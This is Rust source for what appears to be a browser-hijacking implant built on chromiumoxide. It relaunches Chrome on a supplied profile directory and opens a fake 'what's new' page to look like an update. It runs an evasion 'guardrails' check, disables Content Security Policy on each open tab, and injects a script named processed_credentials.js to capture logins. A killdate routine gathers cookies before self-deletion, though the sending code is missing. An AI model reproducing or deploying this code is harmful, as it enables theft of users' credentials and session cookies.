use chromiumoxide::{
    browser::{Browser, BrowserConfig},
    cdp::browser_protocol::{
        page::{AddScriptToEvaluateOnNewDocumentParams, SetBypassCspParams},
        target::TargetId
    }
};
use std::{
    path::PathBuf,
    collections::HashSet
};
use futures::StreamExt;
use tokio::time::{sleep, Duration};

pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error::Error>> {
    let (mut browser, mut handler) = Browser::launch(
            BrowserConfig::builder()
            .with_head()
            .arg("--start-maximized")
            .arg("--no-startup-window")
            .user_data_dir(&junc_path)
            .viewport(None)
            .disable_default_args()
            .build()?
        ).await?;

    let _ = tokio::spawn(async move { while let Some(_) = handler.next().await {} });

    #[cfg(feature = "debug")]
    println!("[*] Retrieving cookies...");
    let cookies = browser.get_cookies().await?;

    if cookies.is_empty() {
        // Open page for whats new (simulate update)
        let page = browser.new_page("https://developer.chrome.com/new").await?;

        #[cfg(feature = "debug")]
        println!("[*] Checking guardrails...");
        // If we fail the guardrails check
        if !page.evaluate(include_str!("js/guardrails.js")).await?.into_value()? {
            #[cfg(feature = "debug")]
            println!("[-] Guardrails check failed");

            browser.close().await?;
            browser.wait().await?;

            return Ok(true);
        }

        #[cfg(feature = "debug")]
        println!("[+] Guardrails check passed");
    } else {
        let _ = browser.new_page("chrome://newtab").await?;
    }

    // Lookup table to keep track of pages already injected.
    let mut injected_pages: HashSet<TargetId> = HashSet::new();

    #[cfg(feature = "debug")]
    println!("[*] Monitoring pages...");
    loop {
        let pages = browser.pages().await?;

        // If the number of pages is empty, we close the browser
        if pages.is_empty() {
            break;
        }

        // A temporary set to keep track of the pages found in the current iteration.
        let mut current_pages = HashSet::new();

        // For each page
        for page in pages {
            let page_id = page.target_id().clone();
            current_pages.insert(page_id.clone());

            // Check if we have already injected the script into this page.
            if !injected_pages.contains(&page_id) {
                #[cfg(feature = "debug")]
                println!("[+] New page detected");

                #[cfg(feature = "debug")]
                println!("[+] Disabling csp");
                 page.execute(SetBypassCspParams::new(true)).await?;

                #[cfg(feature = "debug")]
                println!("[*] Injecting JS into page with ID: {:?}", page_id);
                page.execute(
                    AddScriptToEvaluateOnNewDocumentParams::builder()
                    .source(include_str!("js/processed_credentials.js"))
                    .build()?,
                )
                .await?;

                injected_pages.insert(page_id);
            }
        }

        // Remove IDs of pages that are now closed.
        injected_pages.retain(|page_id| current_pages.contains(page_id));


        // Wait for a second before checking again
        sleep(Duration::from_secs(1)).await;
    }

    #[cfg(feature = "debug")]
    println!("[*] Checking killdate...");
    let page = browser.new_page("about:blank").await?;
    let delete_self: bool = page.evaluate(include_str!("js/processed_killdate.js")).await?.into_value()?;

    if delete_self {
        #[cfg(feature = "debug")]
        println!("[-] Current date is past killdate.");

        #[cfg(feature = "debug")]
        println!("[*] Retrieving cookies...");
        let _cookies = browser.get_cookies().await?;

        #[cfg(feature = "debug")]
        println!("[*] Sending cookies...");

        #[cfg(feature = "debug")]
        println!("[+] Done");
    } else {
        #[cfg(feature = "debug")]
        println!("[+] Current date is not past killdate.");
    }

    browser.close().await?;
    browser.wait().await?;

    Ok(delete_self)
}
